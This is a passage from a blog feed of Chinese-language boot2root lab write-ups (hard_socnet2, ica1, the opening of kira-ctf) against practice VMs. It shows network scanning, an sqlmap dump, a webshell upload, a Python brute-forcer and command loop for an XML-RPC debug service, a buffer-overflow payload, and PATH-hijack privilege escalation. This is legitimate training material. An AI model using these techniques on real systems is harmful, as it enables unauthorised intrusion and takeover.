]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>hacksudo</tag>
      </tags>
  </entry>
  <entry>
    <title>hard_socnet2</title>
    <url>/2021/10/02/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hard_socnet2/</url>
    <content><![CDATA[<h1 id="hard-socnet2"><a href="#hard-socnet2" class="headerlink" title="hard_socnet2"></a>hard_socnet2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hard_socnet2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.102</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.99    00:0c:29:16:b5:e4       VMware, Inc.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.111   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.129   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.180   00:e0:70:d9:ab:16       DH TECHNOLOGY</span><br><span class="line">192.168.1.202   b0:d5:9d:d6:b0:66       Shenzhen Zowee Technology Co., Ltd</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line"></span><br><span class="line">14 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.049 seconds (124.94 hosts/sec). 14 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.129</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.129</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; nmap -sV -A -p 1-65535 192.168.1.129                                                                                                                                    130 ⨯</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-02 13:28 EDT</span><br><span class="line">Nmap scan report for socnet2.lan (192.168.1.129)</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e5:d3:4e:54:fe:66:3e:f3:b2:a5:4b:51:9f:5f:f9:c6 (RSA)</span><br><span class="line">|   256 de:86:ef:76:93:63:74:83:00:b1:a3:b8:c2:4c:8f:58 (ECDSA)</span><br><span class="line">|_  256 b5:ec:f1:1e:9a:5a:5c:d7:02:3a:9e:1b:f7:c8:b4:53 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Social Network</span><br><span class="line">8000/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.15rc1)</span><br><span class="line">|_http-server-header: BaseHTTP/0.3 Python/2.7.15rc1</span><br><span class="line">|_http-title: Error response</span><br><span class="line">|_xmlrpc-methods: XMLRPC instance doesn't support introspection.</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.19 ms socnet2.lan (192.168.1.129)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.129/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.1.129/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.129/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/10/02 13:28:24 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 315] [--&gt; http://192.168.1.129/images/]</span><br><span class="line">/search.php           (Status: 302) [Size: 1490] [--&gt; index.php]                  </span><br><span class="line">/home.php             (Status: 302) [Size: 4234] [--&gt; index.php]                  </span><br><span class="line">/resources            (Status: 301) [Size: 318] [--&gt; http://192.168.1.129/resources/]</span><br><span class="line">/profile.php          (Status: 302) [Size: 2845] [--&gt; index.php]                     </span><br><span class="line">/data                 (Status: 301) [Size: 313] [--&gt; http://192.168.1.129/data/]     </span><br><span class="line">/index.php            (Status: 200) [Size: 10609]                                    </span><br><span class="line">/includes             (Status: 301) [Size: 317] [--&gt; http://192.168.1.129/includes/] </span><br><span class="line">/friends.php          (Status: 302) [Size: 1669] [--&gt; index.php]                     </span><br><span class="line">/database             (Status: 301) [Size: 317] [--&gt; http://192.168.1.129/database/] </span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]                        </span><br><span class="line">/functions            (Status: 301) [Size: 318] [--&gt; http://192.168.1.129/functions/]</span><br><span class="line">/requests.php         (Status: 302) [Size: 1719] [--&gt; index.php]                     </span><br><span class="line">/server-status        (Status: 403) [Size: 301]                                      </span><br><span class="line">                                                                                     </span><br><span class="line">===============================================================</span><br><span class="line">2021/10/02 13:30:58 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./hard_socnet2/1.png" alt></p>
<ul>
<li>注册账户</li>
</ul>
<p><img data-src="./hard_socnet2/2.png" alt></p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><ul>
<li>通过注入拿到一些数据</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u "http://192.168.1.129/search.php?location=emails&amp;query=1" --cookie "PHPSESSI=ls924suak9n9lg56ln9pv5nte3" -D socialnetwork --dump-all   </span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">admin@localhost.com / admin</span><br><span class="line">testuser@localhost.com / testuser</span><br></pre></td></tr></table></figure>

<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
<li>头像处上传<code>webshell</code></li>
</ul>
<p><img data-src="./hard_socnet2/3.png" alt></p>
<ul>
<li>反弹<code>shell</code></li>
</ul>
<p><img data-src="./hard_socnet2/4.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.129/data/images/profiles/1.php</span><br></pre></td></tr></table></figure>

<p><img data-src="./hard_socnet2/5.png" alt></p>
<ul>
<li>发现命令执行，只需要暴力破解<code>debugging_pass</code>即可</li>
<li>脚本如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">proxy = xmlrpc.client.ServerProxy(<span class="string">"http://192.168.1.129:8000/"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">	print(i)</span><br><span class="line">	output = proxy.secure_cmd(<span class="string">"id"</span>, i)</span><br><span class="line">	print(output)</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到密码</li>
</ul>
<p><img data-src="./hard_socnet2/6.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import xmlrpc.client</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">proxy &#x3D; xmlrpc.client.ServerProxy(&quot;http:&#x2F;&#x2F;192.168.1.129:8000&#x2F;&quot;)</span><br><span class="line">while(1):</span><br><span class="line">    cmd &#x3D; input()</span><br><span class="line">    output &#x3D; proxy.secure_cmd(cmd, 2653)</span><br><span class="line">    print(output)</span><br></pre></td></tr></table></figure>

<ul>
<li>为了方便，再弹一个<code>shell</code></li>
</ul>
<p><img data-src="./hard_socnet2/7.png" alt></p>
<h3 id="提权-amp-amp-flag"><a href="#提权-amp-amp-flag" class="headerlink" title="提权&amp;&amp;flag"></a>提权&amp;&amp;flag</h3><ul>
<li>发现溢出问题</li>
</ul>
<p><img data-src="./hard_socnet2/8.png" alt></p>
<ul>
<li>利用如下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import struct; print(&#39;a\n1\n1\n1\n1&#39;+ &#39;A&#39;*61 +struct.pack(&#39;I&#39;,0x08048676))&quot; &gt; payload</span><br><span class="line">cat payload - | .&#x2F;add_record</span><br></pre></td></tr></table></figure>

<p><img data-src="./hard_socnet2/9.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>BoredHackerBlog</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>BoredHackerBlog</tag>
      </tags>
  </entry>
  <entry>
    <title>ica1</title>
    <url>/2021/11/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/ica1/</url>
    <content><![CDATA[<h1 id="ica1"><a href="#ica1" class="headerlink" title="ica1"></a>ica1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>ica1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\ica1&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.110   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.97    38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd. (DUP: 1)</span><br><span class="line"></span><br><span class="line">11 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.027 seconds (126.30 hosts/sec). 11 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.110</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.110</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\ica1&gt; nmap -sV -A -p 1-65535 192.168.1.110</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-13 18:33 EST</span><br><span class="line">Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan</span><br><span class="line">NSE Timing: About 0.00% done</span><br><span class="line">Nmap scan report for debian.lan (192.168.1.110)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)</span><br><span class="line">|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)</span><br><span class="line">|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.48 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.48 (Debian)</span><br><span class="line">|_http-title: qdPM | Login</span><br><span class="line">3306/tcp  open  mysql   MySQL 8.0.26</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 8.0.26</span><br><span class="line">|   Thread ID: 41</span><br><span class="line">|   Capabilities flags: 65535</span><br><span class="line">|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, LongColumnFlag, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake, InteractiveClient, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsCompression, LongPassword, FoundRows, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: \x03#\x07+t\x0204&gt;/k7z2BLq\,f</span><br><span class="line">|_  Auth Plugin Name: caching_sha2_password</span><br><span class="line">| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate</span><br><span class="line">| Not valid before: 2021-09-25T10:47:29</span><br><span class="line">|_Not valid after:  2031-09-23T10:47:29</span><br><span class="line">33060/tcp open  mysqlx?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: </span><br><span class="line">|     Invalid message"</span><br><span class="line">|     HY000</span><br><span class="line">|   LDAPBindReq: </span><br><span class="line">|     *Parse error unserializing protobuf message"</span><br><span class="line">|     HY000</span><br><span class="line">|   oracle-tns: </span><br><span class="line">|     Invalid message-frame."</span><br><span class="line">|_    HY000</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port33060-TCP:V=7.91%I=7%D=11/13%Time=61904B64%P=x86_64-pc-linux-gnu%r(</span><br><span class="line">SF:NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b</span><br><span class="line">SF:\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPO</span><br><span class="line">SF:ptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0</span><br><span class="line">SF:b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVer</span><br><span class="line">SF:sionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,</span><br><span class="line">SF:2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0f</span><br><span class="line">SF:Invalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"</span><br><span class="line">SF:)%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0</span><br><span class="line">SF:1\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCooki</span><br><span class="line">SF:e,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\</span><br><span class="line">SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\</span><br><span class="line">SF:"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,</span><br><span class="line">SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05</span><br><span class="line">SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY</span><br><span class="line">SF:000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString</span><br><span class="line">SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x</span><br><span class="line">SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"</span><br><span class="line">SF:\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01</span><br><span class="line">SF:\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20m</span><br><span class="line">SF:essage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LA</span><br><span class="line">SF:NDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0</span><br><span class="line">SF:\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesR</span><br><span class="line">SF:PC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\</span><br><span class="line">SF:x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\</span><br><span class="line">SF:x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,</span><br><span class="line">SF:"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invali</span><br><span class="line">SF:d\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\</span><br><span class="line">SF:x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x1</span><br><span class="line">SF:0\x88'\x1a\x0fInvalid\x20message\"\x05HY000");</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.15 ms debian.lan (192.168.1.110)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 18.02 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.110/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\ica1&gt; gobuster dir -u http://192.168.1.110/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.110/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/13 18:35:48 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 5664]</span><br><span class="line">/uploads              (Status: 301) [Size: 316] [--&gt; http://192.168.1.110/uploads/]</span><br><span class="line">/images               (Status: 301) [Size: 315] [--&gt; http://192.168.1.110/images/] </span><br><span class="line">/css                  (Status: 301) [Size: 312] [--&gt; http://192.168.1.110/css/]    </span><br><span class="line">/template             (Status: 301) [Size: 317] [--&gt; http://192.168.1.110/template/]</span><br><span class="line">/install              (Status: 301) [Size: 316] [--&gt; http://192.168.1.110/install/] </span><br><span class="line">/manual               (Status: 301) [Size: 315] [--&gt; http://192.168.1.110/manual/]  </span><br><span class="line">/core                 (Status: 301) [Size: 313] [--&gt; http://192.168.1.110/core/]    </span><br><span class="line">/js                   (Status: 301) [Size: 311] [--&gt; http://192.168.1.110/js/]      </span><br><span class="line">/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.1.110/javascript/]</span><br><span class="line">/check.php            (Status: 200) [Size: 0]                                         </span><br><span class="line">/sf                   (Status: 301) [Size: 311] [--&gt; http://192.168.1.110/sf/]        </span><br><span class="line">/readme.txt           (Status: 200) [Size: 470]                                       </span><br><span class="line">/robots.txt           (Status: 200) [Size: 26]                                        </span><br><span class="line">/backups              (Status: 301) [Size: 316] [--&gt; http://192.168.1.110/backups/]   </span><br><span class="line">/batch                (Status: 301) [Size: 314] [--&gt; http://192.168.1.110/batch/]     </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                       </span><br><span class="line">                                                                                      </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/13 18:37:53 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./ica1/1.png" alt></p>
<h3 id="敏感信息泄漏"><a href="#敏感信息泄漏" class="headerlink" title="敏感信息泄漏"></a>敏感信息泄漏</h3><p><a href="https://www.exploit-db.com/exploits/50176" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/50176</a></p>
<p><img data-src="./ica1/2.png" alt></p>
<ul>
<li>成功拿到数据库账号密码信息</li>
</ul>
<p><img data-src="./ica1/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">all:</span><br><span class="line">  doctrine:</span><br><span class="line">    class: sfDoctrineDatabase</span><br><span class="line">    param:</span><br><span class="line">      dsn: 'mysql:dbname=qdpm;host=localhost'</span><br><span class="line">      profiler: false</span><br><span class="line">      username: qdpmadmin</span><br><span class="line">      password: "&lt;?php echo urlencode('UcVQCMQk2STVeS6J') ; ?&gt;"</span><br><span class="line">      attributes:</span><br><span class="line">        quote_identifier: true  </span><br><span class="line">        </span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br><span class="line">qdpmadmin / UcVQCMQk2STVeS6J</span><br></pre></td></tr></table></figure>

<ul>
<li>连接数据库</li>
</ul>
<p><img data-src="./ica1/4.png" alt></p>
<ul>
<li><p>本地搭建替换密码<code>hash</code></p>
</li>
<li><p>成功修改密码，进入后台</p>
</li>
</ul>
<p><img data-src="./ica1/5.png" alt></p>
<ul>
<li>添加账户</li>
</ul>
<p><img data-src="./ica1/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bmjoker@qq.com / 123456</span><br></pre></td></tr></table></figure>

<p><img data-src="./ica1/7.png" alt></p>
<h3 id="上传shell-amp-amp-提权"><a href="#上传shell-amp-amp-提权" class="headerlink" title="上传shell&amp;&amp;提权"></a>上传shell&amp;&amp;提权</h3><p><img data-src="./ica1/8.png" alt></p>
<ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./ica1/9.png" alt></p>
<ul>
<li>发现文件</li>
</ul>
<p><img data-src="./ica1/10.png" alt></p>
<p><img data-src="./ica1/11.png" alt></p>
<ul>
<li>环境变量提权</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># fail</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">echo $PATH</span><br><span class="line">cp &#x2F;bin&#x2F;bash .&#x2F;cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">&#x2F;opt&#x2F;get_access</span><br><span class="line"></span><br><span class="line"># successful</span><br><span class="line">cd &#x2F;tmp</span><br><span class="line">echo $PATH</span><br><span class="line">echo &#39;&#x2F;bin&#x2F;bash&#39; &gt;&gt; cat</span><br><span class="line">chmod 777 cat</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">&#x2F;opt&#x2F;get_access</span><br></pre></td></tr></table></figure>

<p><img data-src="./ica1/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>ICA</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>ICA</tag>
      </tags>
  </entry>
  <entry>
    <title>kira-ctf</title>
    <url>/2021/01/10/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/kira-ctf/</url>
    <content><![CDATA[<h1 id="kira-ctf"><a href="#kira-ctf" class="headerlink" title="kira-ctf"></a>kira-ctf</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>kira-ctf</li>
<li>windows10</li>
</ul>
